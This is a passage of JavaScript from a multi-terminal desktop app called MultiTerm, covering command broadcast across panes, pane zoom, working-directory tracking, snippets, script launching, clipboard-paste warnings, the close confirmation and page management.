  elements.broadcastScope.dataset.scope = state.broadcastScope;
  elements.broadcastScope.textContent = broadcastScopeLabel();
}

function broadcastScopeLabel() {
  if (state.broadcastScope === "active") return "Active only";
  if (state.broadcastScope === "group") return "Color group";
  return "All terminals";
}

// "group" targets every pane sharing the active pane's label colour, giving
// Terminator-style terminal groups without a separate grouping UI.
function broadcastTargetIds() {
  if (state.broadcastScope === "active") {
    return state.activeId ? [state.activeId] : [];
  }
  if (state.broadcastScope === "group") {
    const active = state.activeId ? state.terminals.get(state.activeId) : null;
    if (!active) return [];
    const color = active.color || null;
    return [...state.terminals.values()].filter((terminal) => (terminal.color || null) === color).map((terminal) => terminal.id);
  }
  return [...state.terminals.keys()];
}

function sendBroadcast() {
  // One keystroke here types into every matching terminal at once, so the text is
  // filtered before it is fanned out: with "send Enter" off the user is promised
  // the command is only staged, and an embedded CR would run it everywhere.
  const command = safeTerminalCommand(elements.broadcastInput.value);
  if (!command) return;

  // No terminals at all: open one and run the command there once it is live.
  if (state.terminals.size === 0) {
    addTerminal({
      reveal: true,
      runStartup: true,
      pendingCommand: command,
      pendingCommandEnter: state.settings.broadcastSendEnter
    });
    log.info("broadcast", "Broadcast with no terminals open; started a new terminal", { command });
    toast("No terminals open \u2014 started one and ran the command", "success", 2200);
    elements.broadcastInput.select();
    return;
  }

  const ids = broadcastTargetIds();

  if (ids.length === 0) {
    toast("No target terminal", "info", 1800);
    return;
  }

  let sent = 0;
  const suffix = state.settings.broadcastSendEnter ? "\r" : "";
  for (const id of ids) {
    if (sendBridge({ type: "input", id, data: `${command}${suffix}` })) sent += 1;
  }

  log.info("broadcast", `Broadcast to ${sent} ${sent === 1 ? "terminal" : "terminals"}`, { scope: state.broadcastScope });
  toast(`Sent to ${sent} ${sent === 1 ? "terminal" : "terminals"}`, "success", 1600);
  elements.broadcastInput.select();
}

// When off, the command text is staged in each terminal without a trailing
// Enter, so the user can review/edit before running it themselves.
function updateBroadcastEnterToggle() {
  const on = Boolean(state.settings.broadcastSendEnter);
  elements.broadcastEnter.dataset.on = on ? "true" : "false";
  elements.broadcastEnter.setAttribute("aria-pressed", on ? "true" : "false");
  elements.broadcastEnter.textContent = on ? "Enter: on" : "Enter: off";
  elements.broadcastEnter.title = on
    ? "Enter is sent after each command (runs it). Click to send without Enter."
    : "Command is sent without Enter (not run). Click to send Enter after it.";
}

/* ---------------- Maximize / zoom pane --------------- */

// Transient full-stage zoom of one pane (Terminator's toggle_zoom), layered on
// top of whatever layout is active. Toggling off restores the normal layout.
function toggleZoomPane(id) {
  const targetId = id || state.activeId;
  if (!targetId || !state.terminals.has(targetId)) return;
  // Minimized panes are hidden, so zooming one would blank the stage.
  if (state.terminals.get(targetId).minimized) return;
  state.zoomedId = state.zoomedId === targetId ? null : targetId;
  applyZoom();
}

// A maximized pane hides every sibling, so the zoom may only take effect while
// its own page is showing. Otherwise switching pages leaves the new page blank
// even though its sessions are alive.
function effectiveZoomedId() {
  const terminal = state.zoomedId ? state.terminals.get(state.zoomedId) : null;
  if (!terminal || terminal.minimized || !isOnActivePage(terminal)) return null;
  return terminal.id;
}

function applyZoom() {
  if (state.zoomedId && !state.terminals.has(state.zoomedId)) state.zoomedId = null;
  const zoomed = effectiveZoomedId();
  elements.host.classList.toggle("has-zoom", Boolean(zoomed));
  let glyphChanged = false;
  for (const terminal of state.terminals.values()) {
    terminal.pane.classList.toggle("is-zoomed", terminal.id === zoomed);
    if (updateMaximizeButton(terminal)) glyphChanged = true;
  }
  if (glyphChanged) refreshIcons();
  if (zoomed) setActiveTerminal(zoomed);
  for (const terminal of state.terminals.values()) {
    scheduleFit(terminal);
  }
  rebalanceWebglRenderers();
  scheduleTerminalConnections();
}

// The header button doubles as the restore control while a pane is maximized, so
// its glyph and labels track the zoom state rather than staying "Maximize".
// Returns whether the glyph placeholder was re-seeded (lucide must re-render).
function updateMaximizeButton(terminal) {
  const button = terminal.pane.querySelector('button[data-action="maximize"]');
  if (!button) return false;

  const isZoomed = state.zoomedId === terminal.id;
  const label = isZoomed ? "Restore size (Ctrl+Shift+X)" : "Maximize (Ctrl+Shift+X)";
  const icon = isZoomed ? "minimize-2" : "maximize-2";

  button.title = label;
  button.setAttribute("aria-label", label);
  button.setAttribute("aria-pressed", isZoomed ? "true" : "false");

  // lucide swaps the <i> for an <svg>, so seed a fresh placeholder when the glyph
  // changes instead of trying to mutate the rendered svg in place.
  if (button.dataset.icon === icon) return false;
  button.dataset.icon = icon;
  button.textContent = "";
  const placeholder = document.createElement("i");
  placeholder.setAttribute("data-lucide", icon);
  button.append(placeholder);
  return true;
}

/* ---------------- Working directory --------------- */

// Track each pane's directory from OSC 7 (file://) and OSC 9;9 (ConEmu/Windows
// Terminal) sequences when the shell emits them; otherwise the initial cwd
// stands in. Powers "Open folder" and "New terminal here".
function registerCwdTracking(terminal) {
  const parser = terminal.term.parser;
  if (!parser || typeof parser.registerOscHandler !== "function") return;

  parser.registerOscHandler(7, (data) => {
    const match = String(data || "").match(/^file:\/\/[^/]*(\/.*)$/);
    if (match) {
      let dir = decodeURIComponent(match[1]);
      if (/^\/[A-Za-z]:/.test(dir)) dir = dir.slice(1);
      updateTerminalCwd(terminal, dir);
    }
    return false;
  });

  parser.registerOscHandler(9, (data) => {
    const raw = String(data || "");
    if (raw.startsWith("9;")) {
      updateTerminalCwd(terminal, raw.slice(2).replace(/^"|"$/g, ""));
    }
    return false;
  });
}

// Copilot's TUI (like many modern TUIs) turns on xterm's modifyOtherKeys with
// `CSI > 4 ; 2 m` so it can tell Ctrl+Enter from Enter. xterm.js does not
// implement the protocol, so both keys collapsed to CR and the TUI's own
// "queue this message" binding could never fire.
function registerModifiedKeyReporting(terminal) {
  const parser = terminal.term.parser;
  if (!parser || typeof parser.registerCsiHandler !== "function") return;

  parser.registerCsiHandler({ prefix: ">", final: "m" }, (params) => {
    if (params[0] === 4) terminal.modifyOtherKeys = Number(params[1]) || 0;
    return true;
  });
}

// Level 1 reports only modified keys that have no unique escape sequence of
// their own; level 2 also reports the shift/alt forms. Unmodified keys are
// never reported, so plain Enter keeps sending CR.
function modifiedEnterSequence(terminal, event) {
  if (event.code !== "Enter" && event.code !== "NumpadEnter") return "";
  if (event.isComposing) return "";
  const level = terminal.modifyOtherKeys;
  const ctrlOrMeta = event.ctrlKey || event.metaKey;
  if (level < 1 || (level < 2 && !ctrlOrMeta)) return "";
  const modifier = 1
    + (event.shiftKey ? 1 : 0)
    + (event.altKey ? 2 : 0)
    + (event.ctrlKey ? 4 : 0)
    + (event.metaKey ? 8 : 0);
  return modifier === 1 ? "" : `\x1b[27;${modifier};13~`;
}

function updateTerminalCwd(terminal, dir) {
  const clean = String(dir || "").trim().replace(/\//g, "\\");
  if (!clean) return;
  terminal.cwd = clean;
  refreshTerminalSearchText(terminal);
  if (terminal.id === state.activeId) updateStatusBar();
}

function revealTerminalCwd(terminal) {
  if (!terminal) return;
  if (!terminal.cwd) {
    toast("Working directory unknown", "info", 1800);
    return;
  }
  revealPath(terminal.cwd);
}

// Only the bridge can open Explorer; the browser cannot reach the file system.
function revealPath(path) {
  if (!path) {
    toast("Working directory unknown", "info", 1800);
    return;
  }
  if (!sendBridge({ type: "reveal", path })) {
    toast("Bridge unavailable", "error");
  }
}

/* ---------------- Command snippets --------------- */

function runSnippet(id, snippet) {
  const targetId = id || state.activeId;
  if (!targetId || !state.terminals.has(targetId)) {
    toast("No active terminal", "info", 1600);
    return;
  }
  if (!snippet || !snippet.command) return;
  // Snippets live in localStorage and are run with a trailing Enter, so a stored
  // newline would chain a second command the menu never showed.
  const command = safeTerminalCommand(snippet.command);
  if (!command) {
    toast("That snippet is malformed and was not run.", "error", 2400);
    return;
  }
  sendBridge({ type: "input", id: targetId, data: `${command}\r` });
}

function addSnippet(name, command) {
  const trimmedCommand = safeTerminalCommand(command);
  if (!trimmedCommand) {
    toast("Enter a command", "info", 1600);
    return;
  }
  const trimmedName = String(name || "").trim() || trimmedCommand;
  state.settings.snippets = [...(state.settings.snippets || []), { name: trimmedName, command: trimmedCommand }];
  saveSettings();
  elements.snippetName.value = "";
  elements.snippetCommand.value = "";
  renderSnippets();
}

function removeSnippet(index) {
  const list = [...(state.settings.snippets || [])];
  list.splice(index, 1);
  state.settings.snippets = list;
  saveSettings();
  renderSnippets();
}

function renderSnippets() {
  const host = elements.snippetList;
  if (!host) return;
  host.innerHTML = "";
  const list = state.settings.snippets || [];

  if (list.length === 0) {
    const empty = document.createElement("p");
    empty.className = "snippet-empty";
    empty.textContent = "No snippets yet.";
    host.append(empty);
    invalidateSettingsSearchItem(host);
    return;
  }

  list.forEach((snippet, index) => {
    const row = document.createElement("div");
    row.className = "snippet-row";

    const run = document.createElement("button");
    run.type = "button";
    run.className = "snippet-run";
    run.title = `Run: ${snippet.command}`;
    run.textContent = snippet.name || snippet.command;
    run.addEventListener("click", () => runSnippet(state.activeId, snippet));

    const remove = document.createElement("button");
    remove.type = "button";
    remove.className = "snippet-del";
    remove.title = "Delete snippet";
    remove.setAttribute("aria-label", "Delete snippet");
    remove.innerHTML = '<i data-lucide="trash-2"></i>';
    remove.addEventListener("click", () => removeSnippet(index));

    row.append(run, remove);
    host.append(row);
  });
  refreshIcons();
  invalidateSettingsSearchItem(host);
}

/* ---------------- Session logging --------------- */

function toggleLogging(terminal) {
  if (!terminal) return;
  if (terminal.logging) {
    sendBridge({ type: "logStop", id: terminal.id });
  } else if (!sendBridge({ type: "logStart", id: terminal.id })) {
    toast("Bridge unavailable", "error");
  }
}

// Hands the log to whatever the OS opens .log files with. Only the bridge can do
// this — the browser cannot launch a local file, and the installed app has no
// Electron shell to fall back on.
function openLogFile(terminal) {
  if (!terminal || !terminal.logPath) return;
  if (!sendBridge({ type: "openPath", path: terminal.logPath })) {
    toast("Bridge unavailable", "error");
  }
}

/* ---------------- Run a script --------------- */

// Opens the native file picker and runs the chosen .ps1/.bat/.cmd in the target
// terminal, starting from that terminal's own folder.
async function browseAndRunScript(id) {
  const targetId = id || state.activeId;
  if (!targetId || !state.terminals.has(targetId)) {
    toast("No active terminal", "info", 1600);
    return;
  }

  const scriptPath = await pickScriptPath(state.terminals.get(targetId).cwd);
  if (!scriptPath) return;

  const command = buildScriptCommand(state.terminals.get(targetId), scriptPath);
  if (!sendBridge({ type: "input", id: targetId, data: `${command}\r` })) {
    toast("Bridge unavailable", "error");
    return;
  }
  setActiveTerminal(targetId);
  toast(`Running ${scriptPath.split(/[\\/]/).pop()}`, "success", 2400);
}

// Returns the chosen script path, or null when the user cancelled or no picker
// could be opened. Electron's dialog is used when the app runs under it; the
// installed build is a plain browser window, so the bridge opens the native
// dialog on its behalf.
async function pickScriptPath(cwd) {
  if (window.multiterm && typeof window.multiterm.pickScript === "function") {
    try {
      return (await window.multiterm.pickScript()) || null;
    } catch {
      toast("Could not open the file picker", "error");
      return null;
    }
  }

  if (!state.socketReady) {
    toast("Bridge unavailable", "error");
    return null;
  }
  return requestBridge({ type: "pickScript", cwd: cwd || elements.cwdInput.value || "" });
}

// The surface menu has no terminal to run in, so one is opened for the script.
// The picker runs first on purpose: cancelling it must not leave an empty
// terminal behind.
async function browseAndRunScriptInNewTerminal(options = {}) {
  const scriptPath = await pickScriptPath(options.cwd);
  if (!scriptPath) return;

  const shell = elements.shellSelect.value;
  const command = buildScriptCommand({ shell }, scriptPath);
  const name = scriptPath.split(/[\\/]/).pop();
  const spawn = options.elevated ? newAdminTerminal : addTerminal;

  spawn({
    reveal: true,
    runStartup: true,
    shell,
    cwd: options.cwd || undefined,
    title: options.elevated ? `Admin: ${name}` : name,
    // Queued rather than sent: the shell is not live yet.
    pendingCommand: command
  });
  toast(`Running ${name} in a new terminal`, "success", 2400);
}

function buildScriptCommand(terminal, scriptPath) {
  const ext = (scriptPath.split(".").pop() || "").toLowerCase();
  const shell = (terminal && terminal.shell ? terminal.shell : "").toLowerCase();
  const isCmd = shell.includes("command prompt") || shell.includes("cmd");

  if (isCmd) {
    // In cmd.exe, run batch files directly and .ps1 via powershell.
    return ext === "ps1"
      ? `powershell -ExecutionPolicy Bypass -File "${scriptPath}"`
      : `call "${scriptPath}"`;
  }

  // PowerShell family: the call operator runs .ps1, .bat and .cmd. Single-quote
  // the path (no expansion) and escape embedded single quotes.
  const escaped = scriptPath.replace(/'/g, "''");
  return `& '${escaped}'`;
}

/* ---------------- Paste --------------- */

// Copilot CLI's bordered output can put an ASCII pipe at the end of every copied
// line. Only clean multi-line clipboard text when most non-empty lines carry the
// border, which avoids changing ordinary shell commands such as `command |`.
function normalizeClipboardText(text) {
  if (!state.settings.cleanCopilotClipboard || typeof text !== "string") return text;
  const lines = text.split(/\r\n|\n|\r/);
  const content = lines.filter((line) => line.trim().length > 0);
  if (content.length < 2) return text;
  const bordered = content.filter((line) => /\|[ \t]*$/.test(line)).length;
  if (bordered / content.length < 0.6) return text;
  const newline = text.includes("\r\n") ? "\r\n" : "\n";
  return lines.map((line) => line.replace(/[ \t]*\|[ \t]*$/, "")).join(newline);
}

function readClipboardText() {
  if (window.multiterm?.readClipboardText) {
    return window.multiterm.readClipboardText();
  }
  if (!navigator.clipboard?.readText) {
    return Promise.reject(new Error("Clipboard read access is unavailable."));
  }
  return navigator.clipboard.readText();
}

async function pasteIntoTerminal(id) {
  if (!id || !state.terminals.has(id)) return;
  try {
    const text = normalizeClipboardText(await readClipboardText());
    if (text) state.terminals.get(id).term.paste(text);
  } catch {
    toast("Clipboard unavailable", "error");
  }
}

function keyboardFocusedTerminal() {
  return [...state.terminals.values()].find((terminal) => (
    terminal.term.element?.contains(document.activeElement)
  )) || null;
}

async function pasteAndExecute() {
  const focused = keyboardFocusedTerminal();
  let text;
  try {
    text = normalizeClipboardText(await readClipboardText());
  } catch {
    toast("Clipboard unavailable", "error");
    return false;
  }
  if (!text) {
    toast("The clipboard does not contain text", "info", 1800);
    return false;
  }

  if (focused?.status === "live") {
    const enterSequence = terminalEnterSequence(focused);
    if (!pasteIntoSpecificTerminal(focused, text)) return false;
    scheduleTerminalEnter(focused, { sequence: enterSequence });
    window.requestAnimationFrame(() => focused.term.focus());
    return true;
  }
  if (focused?.status === "starting") {
    focused.pendingPaste = text;
    focused.pendingPasteEnter = true;
    toast(`Clipboard text will run when ${focused.titleInput.value || "the terminal"} is ready`, "info", 2200);
    return true;
  }

  const currentPageId = state.activePageId;
  const terminal = addTerminal({
    reveal: true,
    runStartup: true,
    pageId: currentPageId,
    pendingPaste: text,
    pendingPasteEnter: true
  });
  toast(`Opening ${terminal.titleInput.value || "a new terminal"} on ${pageName(currentPageId) || "the current page"}`, "success", 2200);
  return true;
}

function pasteIntoActive() {
  if (state.activeId) pasteIntoTerminal(state.activeId);
}

/* ---------------- Right-click paste --------------- */

const RIGHT_CLICK_LEVELS = { "": 0, menu: 0, paste: 1, pasteRun: 2 };

function rightClickAckLevel(value) {
  return RIGHT_CLICK_LEVELS[value] || 0;
}

// Right-click paste is either "paste" (drop clipboard text in) or "pasteRun"
// (drop it in and press Enter). The first time each escalation happens we warn,
// because pasting — especially auto-running — clipboard contents can run
// arbitrary commands. The acknowledgement persists in settings.
function handleRightClickPaste(terminal, action) {
  const needsWarning = rightClickAckLevel(state.settings.rightClickAck) < rightClickAckLevel(action);
  if (needsWarning) {
    showRightClickWarning(action, terminal.id);
  } else {
    performRightClickPaste(terminal.id, action === "pasteRun");
  }
}

async function performRightClickPaste(id, execute) {
  if (!id || !state.terminals.has(id)) return;
  try {
    const text = normalizeClipboardText(await readClipboardText());
    if (!text) return;
    const terminal = state.terminals.get(id);
    const enterSequence = terminalEnterSequence(terminal);
    if (!pasteIntoSpecificTerminal(terminal, text)) return;
    if (execute) scheduleTerminalEnter(terminal, { sequence: enterSequence });
  } catch {
    toast("Clipboard unavailable", "error");
  }
}

const rightClickWarn = { action: null, terminalId: null };

function showRightClickWarning(action, terminalId) {
  rightClickWarn.action = action;
  rightClickWarn.terminalId = terminalId;
  elements.rightClickWarnText.textContent = action === "pasteRun"
    ? "Right-clicking a terminal will paste your clipboard contents and run them immediately, as if you pressed Enter. Only continue if you trust what's on your clipboard, since this can execute arbitrary commands."
    : "Right-clicking a terminal will paste your clipboard contents into it. Make sure you trust what's on your clipboard before continuing.";
  elements.rightClickWarnProceed.textContent = action === "pasteRun" ? "Paste & run" : "Paste";
  elements.rightClickWarnRemember.checked = false;
  elements.rightClickWarnOverlay.hidden = false;
  window.requestAnimationFrame(() => {
    elements.rightClickWarnOverlay.classList.add("is-open");
    elements.rightClickWarnProceed.focus();
  });
  refreshIcons();
}

function closeRightClickWarning() {
  elements.rightClickWarnOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.rightClickWarnOverlay.hidden = true;
  }, 150);
  rightClickWarn.action = null;
  rightClickWarn.terminalId = null;
}

function confirmRightClickWarning() {
  const { action, terminalId } = rightClickWarn;
  if (elements.rightClickWarnRemember.checked && action) {
    state.settings.rightClickAck = action;
    saveSettings();
  }
  closeRightClickWarning();
  if (terminalId) performRightClickPaste(terminalId, action === "pasteRun");
}

function bindRightClickWarning() {
  elements.rightClickWarnCancel.addEventListener("click", closeRightClickWarning);
  elements.rightClickWarnProceed.addEventListener("click", confirmRightClickWarning);
  elements.rightClickWarnOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.rightClickWarnOverlay) closeRightClickWarning();
  });
  document.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && !elements.rightClickWarnOverlay.hidden) {
      event.preventDefault();
      closeRightClickWarning();
    }
  });
}

/* ---------------- Close-to-tray confirmation --------------- */

// Entry point invoked when the user tries to close the window (relayed from the
// Electron main process). Honors a remembered choice, otherwise asks first.
function requestAppClose(source = "window") {
  state.closeRequestSource = source === "tray" ? "tray" : "window";
  const action = state.settings.closeAction;
  if (state.closeRequestSource === "window" && action === "tray") {
    finishAppClose(action);
    return;
  }
  openCloseConfirm();
}

function openCloseConfirm() {
  if (!elements.closeConfirmOverlay) return;
  const count = state.terminals.size;
  const sessionLabel = `${count} terminal session${count === 1 ? "" : "s"}`;
  const fromTray = state.closeRequestSource === "tray";
  elements.closeConfirmTitle.textContent = fromTray ? "Quit MultiTerm?" : "Close MultiTerm?";
  elements.closeConfirmText.textContent = `${sessionLabel} ${count === 1 ? "is" : "are"} connected to this bridge. `
    + "Keeping the bridge leaves every terminal and in-progress command running. Closing the bridge first asks each terminal to exit cleanly; commands still running after the grace period are interrupted and then terminated.";
  elements.closeConfirmTray.hidden = fromTray;
  elements.closeConfirmRememberRow.hidden = fromTray;
  elements.closeConfirmRemember.checked = false;
  elements.closeConfirmOverlay.hidden = false;
  window.requestAnimationFrame(() => {
    elements.closeConfirmOverlay.classList.add("is-open");
    (fromTray ? elements.closeConfirmKeep : elements.closeConfirmTray).focus();
  });
  refreshIcons();
}

function closeCloseConfirm() {
  if (!elements.closeConfirmOverlay) return;
  elements.closeConfirmOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.closeConfirmOverlay.hidden = true;
  }, 150);
}

// Picks tray/quit from the modal, optionally remembering it for next time.
function chooseCloseAction(action) {
  if (elements.closeConfirmRemember && elements.closeConfirmRemember.checked
      && state.closeRequestSource === "window" && action === "tray") {
    state.settings.closeAction = action;
    saveSettings();
  }
  closeCloseConfirm();
  finishAppClose(action);
}

// User dismissed the modal (Escape/backdrop): stay open, tell main to abort.
function cancelAppClose() {
  closeCloseConfirm();
  finishAppClose("cancel");
}

// Relays the decision to the Electron main process. No-op in a plain browser.
function finishAppClose(action) {
  state.closeDisposition = action;
  if (action === "quitClose") {
    closeAllTerminals();
  }
  try {
    window.multiterm?.respondClose?.(action);
  } catch { /* not running under Electron */ }
}

function bindCloseConfirm() {
  if (!elements.closeConfirmOverlay) return;
  elements.closeConfirmTray.addEventListener("click", () => chooseCloseAction("tray"));
  elements.closeConfirmKeep.addEventListener("click", () => chooseCloseAction("quitKeep"));
  elements.closeConfirmQuit.addEventListener("click", () => chooseCloseAction("quitClose"));
  elements.closeConfirmOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.closeConfirmOverlay) cancelAppClose();
  });
  document.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && !elements.closeConfirmOverlay.hidden) {
      event.preventDefault();
      cancelAppClose();
    }
  });
  // When running under Electron, the main process asks us before closing.
  try {
    window.multiterm?.onCloseRequest?.((source) => requestAppClose(source));
  } catch { /* not running under Electron */ }
}

/* ---------------- Pages --------------- */

// A page is a live container. Switching pages only hides the panes that belong
// to other pages; their sessions keep running, so a long build on page 2 is
// still going when you come back to it. That is the whole difference between a
// page and a saved workspace, which tears every terminal down and rebuilds it
// from metadata.

function defaultPages() {
  return [{ id: "page-1", name: "Page 1" }];
}

// These run during `const state = {...}` near the top of the file, so they must
// not reference module constants declared further down: those are still in the
// temporal dead zone and would throw straight into the catch, silently
// resetting every page. Inline literals, same as loadSettings.
function loadPages() {
  try {
    const raw = JSON.parse(localStorage.getItem("multiterm.pages") || "null");
    const list = Array.isArray(raw) ? raw : raw?.pages;
    const pages = (Array.isArray(list) ? list : [])
      .filter((page) => page && typeof page.id === "string" && page.id)
      .map((page) => ({ id: page.id, name: String(page.name || "Page") }));
    return pages.length > 0 ? pages : defaultPages();
  } catch {
    return defaultPages();
  }
}

function loadActivePageId(pages) {
  try {
    const raw = JSON.parse(localStorage.getItem("multiterm.pages") || "null");
    const saved = raw?.activePageId;
    if (saved && pages.some((page) => page.id === saved)) return saved;
  } catch { /* fall through to the first page */ }
  return pages[0].id;
}

// Sessions outlive the tab: the bridge hands them back on reconnect, so the
// page each one belonged to has to be remembered separately from the pane list.
function loadTerminalPages() {
  try {
    const value = JSON.parse(localStorage.getItem("multiterm.terminalPages") || "{}");
    return value && typeof value === "object" && !Array.isArray(value) ? value : {};
  } catch {
    return {};
  }
}

function savePages() {
  localStorage.setItem("multiterm.pages", JSON.stringify({ pages: state.pages, activePageId: state.activePageId }));
}

// Merges rather than replaces. On reconnect the bridge re-adopts sessions one at
// a time, and each one calls through here; rebuilding the map from only the
// terminals adopted so far would erase the assignments of every session still
// waiting, collapsing them all onto the active page.
function saveTerminalPages() {
  if (deferDuringBatch("saveTerminalPages")) return;
  const map = { ...state.terminalPages };
  for (const terminal of state.terminals.values()) {
    map[terminal.id] = terminal.pageId;
  }
  state.terminalPages = map;
  localStorage.setItem("multiterm.terminalPages", JSON.stringify(map));
}

// Closing a terminal for real is the one moment we know an id will never come
// back, so it is also the only safe moment to drop it from the map.
function forgetTerminalPages(ids) {
  for (const id of ids) delete state.terminalPages[id];
  localStorage.setItem("multiterm.terminalPages", JSON.stringify(state.terminalPages));
}

function activePage() {
  return state.pages.find((page) => page.id === state.activePageId) || state.pages[0];
}

function pageById(id) {
  return state.pages.find((page) => page.id === id) || null;
}

function pageName(id) {
  return pageById(id)?.name || "";
}

// Resolves whatever a caller supplied down to a page that actually exists,
// falling back to the remembered page for reattached sessions.
function resolvePageId(candidate, terminalId) {
  if (candidate && pageById(candidate)) return candidate;
  const remembered = terminalId ? state.terminalPages[terminalId] : null;
  if (remembered && pageById(remembered)) return remembered;
  return state.activePageId;
}

function terminalsOnPage(pageId) {
  return [...state.terminals.values()].filter((terminal) => terminal.pageId === pageId);
}

function terminalsOnActivePage() {
  return terminalsOnPage(state.activePageId);
}

function isOnActivePage(terminal) {
  return Boolean(terminal) && terminal.pageId === state.activePageId;
}

// Panes stay in the DOM and keep their xterm instance alive; only a class
// decides whether they are laid out. Same trick the terminal filter uses.
function applyPageVisibility() {
  for (const terminal of state.terminals.values()) {
    const hidden = terminal.pageId !== state.activePageId;
    const wasHidden = terminal.pane.classList.contains("is-page-hidden");
    if (hidden === wasHidden) continue;
    terminal.pane.classList.toggle("is-page-hidden", hidden);
    // A pane that was display:none has a zero-size viewport, so xterm needs a
    // fit once it is back in flow or it renders at the wrong dimensions.
    if (wasHidden && !hidden) scheduleFit(terminal);
  }
  rebalanceWebglRenderers();
  scheduleTerminalConnections();
}

function setActivePage(id, options = {}) {
  const page = pageById(id);
  if (!page || state.activePageId === id) return;

  state.activePageId = id;
  applyPageVisibility();
  renderPager();
  updateMinimizedDock();
  savePages();

  // Keep the active terminal on the page you are looking at.
  const onPage = terminalsOnActivePage();
  const active = state.activeId ? state.terminals.get(state.activeId) : null;
  if (options.focus !== false && onPage.length > 0 && (!active || !isOnActivePage(active))) {
    setActiveTerminal(onPage[0].id);
    if (options.focusTerm !== false) onPage[0].term.focus();
  }

  applyZoom();
  updateTerminalActions();
  window.requestAnimationFrame(() => fitAllTerminals());
}

function uniquePageId() {
  let n = state.pages.length + 1;
  while (state.pages.some((page) => page.id === `page-${n}`)) n += 1;
  return `page-${n}`;
}

function addPage(options = {}) {
  const id = uniquePageId();
  const name = String(options.name || "").trim() || `Page ${state.pages.length + 1}`;
  state.pages.push({ id, name });
  savePages();
  renderPager();
  if (options.activate !== false) setActivePage(id);
  log.info("pages", `Added ${name}`);
  return id;
}

function renamePage(id, rawName) {
  const page = pageById(id);
  const name = String(rawName || "").trim();
  if (!page || !name || page.name === name) return;
  page.name = name;
  savePages();
  renderPager();
  renderQuickSwitch();
}

function requestPageClose(id) {
  if (state.pages.length <= 1) {
    toast("Keep at least one page", "info", 1800);
    return false;
  }
  const page = pageById(id);
  if (!page) return false;
  if (terminalsOnPage(id).length === 0) return removePage(id);

  const action = normalizePageCloseAction(state.settings.pageCloseAction);
  if (action === "ask") {
    openPageCloseConfirm({ kind: "page", pageId: id });
    return false;
  }
  return removePage(id, { terminalAction: action });
}

function requestCloseAllPages() {
  const action = normalizePageCloseAction(state.settings.pageCloseAction);
  if (state.terminals.size > 0 && action === "ask") {
    openPageCloseConfirm({ kind: "all" });
    return false;
  }
  return resetAllPages(action);
}

function openPageCloseConfirm(request) {
  state.pendingPageClose = request;
  const closingAll = request.kind === "all";
  const page = closingAll ? null : pageById(request.pageId);
  const count = closingAll ? state.terminals.size : terminalsOnPage(request.pageId).length;
  elements.pageCloseTitle.textContent = closingAll ? "Close all pages?" : "Close page?";
  elements.pageCloseText.textContent = closingAll
    ? `The ${count} terminal${count === 1 ? "" : "s"} across all pages can be moved to one new Page 1 or closed with the pages.`
    : `“${page?.name || "This page"}” contains ${count} terminal${count === 1 ? "" : "s"}. Move ${count === 1 ? "it" : "them"} to a neighbouring page or close ${count === 1 ? "it" : "them"} with the page.`;
  elements.pageCloseRemember.checked = false;
  elements.pageCloseOverlay.hidden = false;
  window.requestAnimationFrame(() => {
    elements.pageCloseOverlay.classList.add("is-open");
    elements.pageCloseMove.focus();
  });
  refreshIcons();
}

function closePageCloseConfirm() {
  state.pendingPageClose = null;
  elements.pageCloseOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.pageCloseOverlay.hidden = true;
  }, 150);
}

function choosePageCloseAction(action) {
  const request = state.pendingPageClose;
  if (!request) return;
  if (elements.pageCloseRemember.checked) {
    state.settings.pageCloseAction = action;
    elements.pageCloseAction.value = action;
    elements.pageCloseAction._combo?.sync();
    saveSettings();
  }
  closePageCloseConfirm();
  if (request.kind === "all") resetAllPages(action);
  else removePage(request.pageId, { terminalAction: action });
}

function bindPageCloseConfirm() {
  elements.pageCloseMove.addEventListener("click", () => choosePageCloseAction("move"));
  elements.pageCloseTerminals.addEventListener("click", () => choosePageCloseAction("close"));
  elements.pageCloseCancel.addEventListener("click", closePageCloseConfirm);
  elements.pageCloseOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.pageCloseOverlay) closePageCloseConfirm();
  });
}

function resetAllPages(terminalAction) {
  const nextPage = defaultPages()[0];
  if (terminalAction === "close") {
    if (!closeAllTerminals()) return false;
  } else {
    for (const terminal of state.terminals.values()) terminal.pageId = nextPage.id;
  }
  state.pages = [nextPage];
  state.activePageId = nextPage.id;
  applyPageVisibility();
  renderPager();
  savePages();
  saveTerminalPages();
  saveSessionSnapshot();
  applyZoom();
  updateTerminalActions();
  window.requestAnimationFrame(() => fitAllTerminals());
  toast(terminalAction === "close" ? "Closed all pages and terminals" : "Closed all pages — moved terminals to Page 1", "info");
  return true;
}

// The low-level operation defaults to moving terminals so internal restore and
// migration paths remain non-destructive. User actions call requestPageClose.
function removePage(id, options = {}) {
  if (state.pages.length <= 1) {
    toast("Keep at least one page", "info", 1800);
    return false;
  }
  const index = state.pages.findIndex((page) => page.id === id);
  if (index === -1) return false;

  const page = state.pages[index];
  const fallback = state.pages[index === 0 ? 1 : index - 1];
  const affected = terminalsOnPage(id);
  const terminalAction = normalizePageCloseAction(options.terminalAction);
  if (terminalAction === "close") {
    for (const terminal of affected) removeTerminal(terminal.id);
    if (terminalsOnPage(id).length > 0) {
      toast(`Could not close every terminal on “${page.name}”`, "error", 3200);
      return false;
    }
  } else {
    for (const terminal of affected) terminal.pageId = fallback.id;
  }
  state.pages.splice(index, 1);

  if (state.activePageId === id) {
    state.activePageId = fallback.id;
  }
  applyPageVisibility();
  renderPager();
  savePages();
  saveTerminalPages();
  applyZoom();
  updateTerminalActions();
  window.requestAnimationFrame(() => fitAllTerminals());

  log.info("pages", `Closed ${page.name}`, {
    closedTerminals: terminalAction === "close" ? affected.length : 0,
    movedTerminals: terminalAction === "close" ? 0 : affected.length
  });
  toast(
    affected.length > 0
      ? terminalAction === "close"
        ? `Closed “${page.name}” and ${affected.length} terminal${affected.length === 1 ? "" : "s"}`
        : `Closed “${page.name}” — moved ${affected.length} terminal${affected.length === 1 ? "" : "s"} to “${fallback.name}”`
      : `Closed “${page.name}”`,
    "info"
  );
  return true;
}

function moveTerminalToPage(terminalId, pageId) {
  const terminal = state.terminals.get(terminalId);
  const page = pageById(pageId);
  if (!terminal || !page || terminal.pageId === pageId) return;

  terminal.pageId = pageId;
  applyPageVisibility();
  renderPager();
